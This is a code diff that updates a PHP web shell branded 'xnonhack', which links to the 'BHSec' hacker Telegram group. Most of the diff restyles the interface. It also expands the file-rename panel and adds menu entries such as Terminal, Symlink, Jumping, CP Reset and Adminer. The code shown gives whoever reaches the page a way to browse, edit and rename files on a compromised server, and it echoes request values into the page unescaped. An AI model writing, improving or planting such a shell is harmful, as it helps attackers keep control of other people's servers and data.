@@ -1,14 +1,19 @@
 <meta name="viewport" content="width=device-width,height=device-height initial-scale=1">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/flexboxgrid/6.3.1/flexboxgrid.min.css" type="text/css" >
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css"/>
 <style type="text/css">
 	@import url('https://fonts.googleapis.com/css2?family=Titillium+Web:wght@600&display=swap');
 	:root {
-		--color-bg:#f2f2f2;
+		--color-bg:#e7f3ff;
+		--bg-body:#f0f2f5;
+	}
+	* {
+		font-family:Helvetica, Arial, sans-serif;
 	}
 	body {
-		font-family: 'Titillium Web', sans-serif;
 		overflow: hidden;
 		margin:10px;
+		background: var(--bg-body);
 	}
 	a {
 		text-decoration: none;
@@ -22,46 +27,55 @@
 	div.header {
 		border-radius:5px 5px 0px 0px;
 		width:100%;
-		background: var(--color-bg);
+		background: #fff;
 		padding-top:15px;
 		padding-bottom:15px;
-		border-top: 1px solid #e6e6e6;
-		border-left: 1px solid #e6e6e6;
-		border-right: 1px solid #e6e6e6;
+		border-top: 1px solid #f2f2f2;
+		border-left: 1px solid #f2f2f2;
+		border-right: 1px solid #f2f2f2;
 	}
 	span.home {
 		margin-left: 15px;
+		font-size:25px;
+		font-weight: bold;
 	}
 	div.center {
+		background: #fff;
 		overflow: auto;
 		max-height:550px;
 		border-radius:0px 0px 5px 0px;
-		padding:10px;
-		border-top: 1px solid #e6e6e6;
-		border-right: 1px solid #e6e6e6;
-		border-bottom: 1px solid #e6e6e6;
+		padding:20px;
+		padding-top: 10px;
 	}
 	div.tool {
+		overflow: auto;
+		background: #fff;
+		max-height:550px;
 		border-radius:0px 0px 0px 5px;
 		width:100%;
 		padding:0px;
-		border: 1px solid #e6e6e6;
 	}
 	div.tool a {
-		background:#f2f2f2;
-		border: 1px solid #e6e6e6;
-		display: block;
+		z-index: 0;
+		overflow: auto;
+		background: var(--color-bg);
+		border: 1px solid #f2f2f2;
 		margin:10px;
+		font-weight: bold;
+		display: block;
+		color: #1889f5;
 		border-radius:5px;
-		padding: 7px;
+		padding: 10px;
+	}
+	div.tool a:hover,
+	input[type=submit]:hover {
+		cursor: pointer;
+		background: #dbe7f2;
+		border: 1px solid #dbe7f2;
 	}
 	div.tool span {
-		font-size:15px;
-		margin:35px;
-	}
-	div.tool img {
-		margin-top:-0px;
-		position: absolute;
+		font-size:14px;
+		margin: 10px;
 	}
 	div.dir, div.file {
 		padding:1px;
@@ -75,44 +89,65 @@
 		text-align: center;
 	}
 	select {
-		background:#f2f2f2;
-		border-radius:4px;
-		border: 1px solid #e6e6e6;
+		background: var(--color-bg);
+		border: 1px solid #f2f2f2;
+		padding:5px;
+		border-radius: 5px;
+		color: #1889f5;
 		outline: none;
-		font-family: 'Titillium Web', sans-serif;
 		width:100%;
 	}
 	div.edit, div.createfile, div.chname, div.infos {
-		padding:10px;
 		width:100%;
 	}
+	div.edit {
+		padding:35px 15px 10px 10px 5px;
+		padding:15px;
+		width:95%;
+		border-radius:7px;
+		background:#fff;
+		border:1px solid #e0e0e0;
+		box-shadow: 0 0px 1.5px rgba(0,0,0,0.15), 0 0px 1.5px rgba(0,0,0,0.16);
+	}
+	div.edit span {
+		font-weight: bold;
+	}
 	textarea {
-		border: 1px solid #e6e6e6;
+		border: 1px solid #f2f2f2;
+		background: #f0f2f5;
 		outline: none;
 		padding:20px;
 		resize: none;
 		width: 100%;
-		height:300px;
+		height:260px;
 		border-radius:5px;
 	}
 	td.action {
 		text-align: center;
 		font-size:25px;
 	}
+	td.edit-header {
+		padding-bottom: 20px;
+	}
 	input[type=submit] {
-		font-family: 'Titillium Web', sans-serif;
 		width:100%;
+		font-weight: bold;
 		border-radius:5px;
-		background:#f2f2f2;
-		border: 1px solid #e6e6e6;
+		background: var(--color-bg);
 		padding:7px;
+		outline:none;
+		border: 1px solid #f2f2f2;
+		color: #1889f5;
 	}
 	input[type=text] {
-		font-family: 'Titillium Web', sans-serif;
 		width:100%;
+		background: #f0f2f5;
 		outline: none;
 		border-radius:5px;
-		border: 1px solid #e6e6e6;
+		border: 1px solid #f2f2f2;
+		padding:7px;
+	}
+	table.edit td {
 		padding:7px;
 	}
 	.icons {
@@ -320,7 +355,7 @@
 				$file['name'] = self::cwd() . DIRECTORY_SEPARATOR . $value;
 				switch ($type) {
 					case 'dir':
-						if (!is_dir($file['name']) || $value === '.') continue 2;
+						if (!is_dir($file['name']) || $value === '.' || $value === '..') continue 2;
 						break;
 					case 'file':
 						if (!is_file($file['name'])) continue 2;
@@ -542,44 +577,67 @@
 	<div class="row">
 		<div class="col-xs-2 tool">
 			<a href="?cd=<?= x::hex(x::cwd()) ?>&info">
-				<img src="https://image.flaticon.com/icons/svg/785/785822.svg" class="icons">
-				<span>Info</span>
+				<i class="fa fa-info-circle" aria-hidden="true"></i> 
+				 <span>Info</span>
 			</a>
-			<a href="#">
-				<img src="https://www.flaticon.com/premium-icon/icons/svg/2242/2242419.svg" class="icons">
+			<a href="?coomingsoong">
+				<i class="fa fa-terminal" aria-hidden="true"></i>
+				<span>Terminal</span>
+			</a>
+			<a href="?coomingsoong">
+				<i class="fa fa-cogs"></i>
 				<span>Config</span>
 			</a>
-			<a href="#">
-				<img src="https://image.flaticon.com/icons/svg/892/892311.svg" class="icons">
+			<a href="?coomingsoong">
+				<i class="fa fa-user"></i>
+				<span>Adminer</span>
+			</a>
+			<a href="?coomingsoong">
+				<i class="fa fa-upload"></i>
 				<span>Upload</span>
 			</a>
+			<a href="?coomingsoong">
+				<i class="fa fa-exclamation-triangle"></i>
+				<span>Jumping</span>
+			</a>
+			<a href="?coomingsoong">
+				<i class="fa fa-exclamation-circle"></i>
+				<span>Symlink</span>
+			</a>
+			<a href="?coomingsoong">
+				<i class="fas fa-network-wired"></i>
+				<span>Network</span>
+			</a>
 			<a href="?cd=<?= x::hex(x::cwd()) ?>&x=make">
-				<img src="https://image.flaticon.com/icons/svg/2921/2921226.svg" class="icons">
+				<i class="fa fa-plus-square" aria-hidden="true"></i>
 				<span>Add File</span>
 			</a>
-			<a href="#">
-				<img src="https://www.flaticon.com/premium-icon/icons/svg/1824/1824913.svg" class="icons">
+			<a href="?coomingsoong">
+				<i class="fa fa-exclamation-triangle"></i>
 				<span>Replace</span>
 			</a>
-			<a href="#">
-				<img src="https://image.flaticon.com/icons/svg/3039/3039386.svg" class="icons">
-				<span>Music</span>
-			</a>
 			<a href="https://t.me/BHSec" target="_blank">
-				<img src="https://www.nicepng.com/png/detail/239-2396381_join-us-society-icon-png.png" class="icons">
+				<i class="fa fa-users" aria-hidden="true"></i>
 				<span>Join Us</span>
 			</a>
-			<a href="#">
-				<img src="https://www.pngitem.com/pimgs/m/25-259878_cpanel-logo-png-transparent-png.png" class="icons">
+			<a href="?coomingsoong">
+				<i class="fa fa-bug" aria-hidden="true"></i>
 				<span>CP Reset</span>
 			</a>
-			<a href="#">
-				<img src="https://image.flaticon.com/icons/svg/786/786446.svg" class="icons">
+			<a href="?coomingsoong">
+				<i class="fa fa-info"></i>
+				<span>About me</span>
+			</a>
+			<a href="?coomingsoong">
+				<i class="fa fa-power-off" aria-hidden="true"></i>
 				<span>Logout</span>
 			</a>
 		</div>
 		<div class="col-xs-10 center">
 			<?php
+			if (isset($_GET['coomingsoong'])) {
+				print("<script>alert('<h2>Cooming Soon</h2>')</script>");
+			}
 			if (isset($_GET['info'])) {
 				?>
 				<div class="infos">
@@ -666,39 +724,129 @@
 				case 'chname':
 					if (isset($_POST['chname'])) {
 						if (x::chname($_POST['file'], x::unhex($_GET['cd']) . DIRECTORY_SEPARATOR . $_POST['newname'])) {
-							print("success");
+							print("<script>alert('success')</script>");
 						} else {
-							print("failed");
+							print("<script>alert('failed')</script>");
 						}
 					}
-					?>
-					<div class="chname">
-						<table width="100%">
-							<tr>
-								<td style="width:1;">
-									<a href="?cd=<?= $_GET['cd'] ?>">
-										<img class="icons" src="https://image.flaticon.com/icons/svg/786/786399.svg">
-									</a>
-								</td>
-								<td class="action" colspan="2">CHANGE NAME</td>
-							</tr>
-							<form method="post">
-								<tr>
-									<td colspan="2">
-										<input type="text" name="newname" value="<?= basename($_POST['file']) ?>">
-									</td>
-								</tr>
-								<tr>
-									<td colspan="2">
-										<input type="submit" name="chname" value="CHANGE">
-										<input type="hidden" name="file" value="<?= x::hex($_POST['file']) ?>">
-										<input type="hidden" name="action" value="chname">
-									</td>
-								</tr>
-							</form>
-						</table>
-					</div>
-					<?php
+					switch ($_POST['file']) {
+						case is_dir($_POST['file']):
+							?>
+							<div class="chname">
+								<table width="100%">
+									<tr>
+										<td style="width:1;" class="edit-header">
+											<a href="?cd=<?= $_GET['cd'] ?>">
+												<img class="icons" src="https://image.flaticon.com/icons/svg/786/786399.svg">
+											</a>
+										</td>
+										<td class="action" colspan="2">CHANGE NAME</td>
+									</tr>
+									<tr>
+										<td style="width:120px;">
+											Dirname
+										</td>
+										<td>:</td>
+										<td>
+											<?= x::w__($_POST['file'], basename($_POST['file'])) ?>
+										</td>
+									</tr>
+									<tr>
+										<td style="width:120px;">
+											Type
+										</td>
+										<td>:</td>
+										<td>
+											<?= filetype($_POST['file']) ?> 
+											<i><?= x::countDir($_POST['file']) ?> items</i>
+										</td>
+									</tr>
+									<tr>
+										<td style="width:120px;">
+											Last Modif
+										</td>
+										<td>:</td>
+										<td>
+											<?= x::ftime($_POST['file']) ?>
+										</td>
+									</tr>
+									<form method="post">
+										<tr>
+											<td colspan="3">
+												<input type="text" name="newname" value="<?= basename($_POST['file']) ?>">
+											</td>
+										</tr>
+										<tr>
+											<td colspan="3">
+												<input type="submit" name="chname" value="CHANGE">
+												<input type="hidden" name="file" value="<?= x::hex($_POST['file']) ?>">
+												<input type="hidden" name="action" value="chname">
+											</td>
+										</tr>
+									</form>
+								</table>
+							</div>
+							<?php
+							break;
+						
+						case is_file($_POST['file']):
+							?>
+							<div class="chname">
+								<table width="100%">
+									<tr>
+										<td style="width:1;" class="edit-header">
+											<a href="?cd=<?= $_GET['cd'] ?>">
+												<img class="icons" src="https://image.flaticon.com/icons/svg/786/786399.svg">
+											</a>
+										</td>
+										<td class="action" colspan="2">CHANGE NAME</td>
+									</tr>
+									<tr>
+										<td style="width:120px;">
+											Filename
+										</td>
+										<td>:</td>
+										<td>
+											<?= x::w__($_POST['file'], basename($_POST['file'])) ?>
+										</td>
+									</tr>
+									<tr>
+										<td style="width:120px;">
+											Size
+										</td>
+										<td>:</td>
+										<td>
+											<?= x::size($_POST['file']) ?>
+										</td>
+									</tr>
+									<tr>
+										<td style="width:120px;">
+											Last Modif
+										</td>
+										<td>:</td>
+										<td>
+											<?= x::ftime($_POST['file']) ?>
+										</td>
+									</tr>
+									<form method="post">
+										<tr>
+											<td colspan="3">
+												<input type="text" name="newname" value="<?= basename($_POST['file']) ?>">
+											</td>
+										</tr>
+										<tr>
+											<td colspan="3">
+												<input type="submit" name="chname" value="CHANGE">
+												<input type="hidden" name="file" value="<?= x::hex($_POST['file']) ?>">
+												<input type="hidden" name="action" value="chname">
+											</td>
+										</tr>
+									</form>
+								</table>
+							</div>
+							<?php
+							break;
+					}
 					exit;
 					break;
 				case 'edit':
@@ -712,14 +860,16 @@
 					?>
 					<form method="post">
 						<div class="edit">
-							<table width='100%'>
+							<table width='100%' class="edit">
 								<tr>
-									<td style="width:1;">
+									<td style="width:1;" class="edit-header">
 										<a href="?cd=<?= $_GET['cd'] ?>">
 											<img class="icons" src="https://image.flaticon.com/icons/svg/786/786399.svg">
 										</a>
 									</td>
-									<td class="action" colspan="2">EDIT</td>
+									<td class="action" colspan="2">
+										<span>EDIT</span>
+									</td>
 								</tr>
 								<tr>
 									<td style="width:120px;">
@@ -772,7 +922,9 @@
 				}
 				?><table width="100%">
 					<tr>
-						<td colspan="5"><?= x::pwd() ?></td>
+						<td colspan="5">
+							<center><?= x::pwd() ?></center>
+						</td>
 					</tr>
 				<?php
 				foreach (x::files('dir') as $dir) { ?>
@@ -802,11 +954,11 @@
 					</form>
 				<?php }
 				foreach (x::files('file') as $file) {
-					if (strlen($file['name']) > 28) {
-						$filename = substr($file['name'], 0, 28)."...-.". pathinfo($file['name'], PATHINFO_EXTENSION);
-					} else {
-						$filename = $file['name'];
-					}
+					//if (strlen($file['name']) > 28) {
+					//	$filename = substr($file['name'], 0, 28)."...-.". pathinfo($file['name'], PATHINFO_EXTENSION);
+					//} else {
+					//	$filename = $file['name'];
+					//}
 					?>
 					<form method="post" action="?cd=<?= x::hex(x::cwd()) ?>">
 						<tr>
@@ -815,7 +967,7 @@
 							</td>
 							<td>
 								<span title="<?= basename($file['name']) ?>">
-									<?= basename($filename) ?>
+									<?= basename($file['name']) ?>
 								</span>
 							</td>
 							<td class="size">
@@ -841,4 +993,8 @@
 		</div>
 	</div>
 </div>
+<?php  ?>
+<span>
+	<i class="fa fa-copyright" aria-hidden="true"></i> xnonhack
+</span>
 </center>
